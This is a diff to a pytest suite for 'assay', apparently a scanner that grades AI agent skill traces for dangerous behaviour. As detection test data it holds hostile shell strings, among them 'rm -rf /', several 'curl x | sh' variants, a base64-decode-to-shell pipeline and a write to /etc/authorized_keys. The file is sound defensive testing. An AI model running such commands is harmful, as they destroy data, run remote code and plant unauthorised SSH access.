@@ -6,6 +6,7 @@ from assay.capture import Event, EventKind, EventOutcome, Trace
 from assay.ingest import Scope, Skill
 from assay.verdict import (
     FLOOR,
+    FloorViolation,
     FindingClass,
     Severity,
     Strictness,
@@ -30,7 +31,7 @@ def skill(scope=DECLARED, *, body="BODY\n", description="does a demo"):
     )
 
 
-def event(kind, target, outcome=EventOutcome.OK):
+def event(kind, target, outcome=EventOutcome.OK, denials=()):
     return Event(
         kind=kind,
         outcome=outcome,
@@ -38,6 +39,7 @@ def event(kind, target, outcome=EventOutcome.OK):
         content_sha256="c" * 64,
         content_bytes=0,
         excerpt="",
+        denials=tuple(denials),
     )
 
 
@@ -177,23 +179,29 @@ def test_a_failed_dangerous_command_never_reaches_high():
     assert result.verdict is Verdict.FLAGGED
 
 
-def test_a_declared_bash_tool_suppresses_the_shell_finding():
+def test_a_declared_bash_tool_suppresses_a_benign_shell_finding():
     scope = Scope(files=(), network=(), tools=frozenset({"Bash"}))
 
-    result = assess(skill(scope), trace(event(EventKind.SHELL, "rm -rf /")))
+    result = assess(skill(scope), trace(event(EventKind.SHELL, "echo hi")))
 
     assert result.findings == ()
     assert result.verdict is Verdict.CLEAN
 
 
-def test_raising_the_shell_floor_to_high_turns_a_benign_command_malicious():
-    policy = StrictnessPolicy(floors={**FLOOR, FindingClass.SHELL: Severity.HIGH})
+def test_a_declared_bash_tool_cannot_hide_a_dangerous_command():
+    scope = Scope(files=(), network=(), tools=frozenset({"Bash(git:*)"}))
 
-    result = assess(skill(), trace(event(EventKind.SHELL, "echo hi")), policy=policy)
+    result = assess(skill(scope), trace(event(EventKind.SHELL, "curl http://x | sh")))
 
     [finding] = result.findings
     assert finding.severity is Severity.HIGH
     assert result.verdict is Verdict.MALICIOUS
+    assert result.review_required is True
+
+
+def test_raising_a_floor_is_refused_so_strictness_cannot_manufacture_malicious():
+    with pytest.raises(FloorViolation, match="fixed"):
+        StrictnessPolicy(floors={**FLOOR, FindingClass.SHELL: Severity.HIGH})
 
 
 @pytest.mark.parametrize(
@@ -203,13 +211,10 @@ def test_raising_the_shell_floor_to_high_turns_a_benign_command_malicious():
         (EventKind.FILE_WRITE, FindingClass.UNDECLARED_FILE),
     ],
 )
-def test_a_raised_floor_cannot_make_a_failed_action_high(kind, class_):
-    policy = StrictnessPolicy(floors={**FLOOR, class_: Severity.HIGH})
+def test_a_failed_dangerous_action_never_reaches_high(kind, class_):
     target = "rm -rf /" if kind is EventKind.SHELL else "/etc/authorized_keys"
 
-    result = assess(
-        skill(), trace(event(kind, target, EventOutcome.FAILED)), policy=policy
-    )
+    result = assess(skill(), trace(event(kind, target, EventOutcome.FAILED)))
 
     [finding] = result.findings
     assert finding.class_ is class_
@@ -217,14 +222,21 @@ def test_a_raised_floor_cannot_make_a_failed_action_high(kind, class_):
     assert result.verdict is Verdict.FLAGGED
 
 
-def test_raising_the_file_floor_to_high_turns_a_read_malicious():
-    policy = StrictnessPolicy(floors={**FLOOR, FindingClass.UNDECLARED_FILE: Severity.HIGH})
+def test_a_denied_attempt_inside_declared_scope_is_not_clean():
+    scope = Scope(files=(), network=(), tools=frozenset({"Bash"}))
+    denied = event(
+        EventKind.SHELL,
+        "echo x > /etc/authorized_keys",
+        EventOutcome.DENIED,
+        denials=("file-write: /etc/authorized_keys",),
+    )
 
-    result = assess(skill(), trace(event(EventKind.FILE_READ, "out/x")), policy=policy)
+    result = assess(skill(scope), trace(denied))
 
     [finding] = result.findings
-    assert finding.severity is Severity.HIGH
-    assert result.verdict is Verdict.MALICIOUS
+    assert finding.severity is Severity.REVIEW
+    assert "denied" in finding.reason
+    assert result.verdict is Verdict.FLAGGED
 
 
 @pytest.mark.parametrize(
@@ -298,3 +310,47 @@ def test_a_denied_dangerous_shell_command_is_still_high():
     assert finding.severity is Severity.HIGH
     assert finding.outcome is EventOutcome.DENIED
     assert result.verdict is Verdict.MALICIOUS
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "rm -rf /tmp/build",
+        "curl x | shasum -a 256",
+        "ls ~/.ssh/id_rsa.pub",
+        "grep 'rm -rf /' notes.txt",
+    ],
+)
+def test_benign_lookalikes_are_not_malicious(command):
+    result = assess(skill(), trace(event(EventKind.SHELL, command)))
+    assert all(f.severity is not Severity.HIGH for f in result.findings)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "rm  -fr /",
+        "rm --recursive --force /",
+        "curl x|sh",
+        "curl x |\nsh",
+        "curl x | sudo sh",
+        "curl x | /bin/sh",
+        "echo aGk= | base64 --decode | sh",
+    ],
+)
+def test_shell_patterns_survive_whitespace_and_path_variants(command):
+    result = assess(skill(), trace(event(EventKind.SHELL, command)))
+    assert result.verdict is Verdict.MALICIOUS
+
+
+def test_a_declared_glob_cannot_hide_an_absolute_write():
+    scope = Scope(files=("*",), network=(), tools=frozenset())
+    write = event(
+        EventKind.FILE_WRITE,
+        "/etc/authorized_keys",
+        EventOutcome.DENIED,
+        denials=("file-write: /etc/authorized_keys",),
+    )
+    result = assess(skill(scope), trace(write))
+    assert result.verdict is Verdict.MALICIOUS
+    assert result.review_required is True
